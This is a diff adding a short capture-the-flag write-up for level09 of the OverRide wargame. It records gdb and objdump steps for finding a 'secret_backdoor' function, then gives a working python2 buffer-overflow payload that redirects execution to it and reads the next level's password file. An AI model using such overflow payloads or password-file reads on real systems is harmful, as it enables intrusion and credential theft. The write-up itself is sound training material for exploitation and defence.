@@ -1,0 +1,28 @@
+scp -P 2223 level09@localhost:level09 /home/ncardozo/Documents/OverRide
+
+gdb ./level09
+info functions
+set disassembly-flavor intel
+disassemble main
+disassemble handle_msg
+disassemble secret_backdoor
+
+objdump -d -M intel level09 | sed -n '/<set_username>:/,/ret/p'
+
+After exploring the code we saw that there is a "secret_backdoor" function
+that calls system. 
+
+So we found that function address:
+
+gdb ./level09
+break main
+run
+print secret_backdoor
+
+0x55555555488c <secret_backdoor>
+
+And we overwrite a value to determine the direction we want the execution goes (system)
+
+cat <(python2 -c 'import sys; sys.stdout.write("a"*0x28 + "\xd0" + "\n" + "a"*0xc8 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n")') - | ./level09
+
+cat /home/users/end/.pass
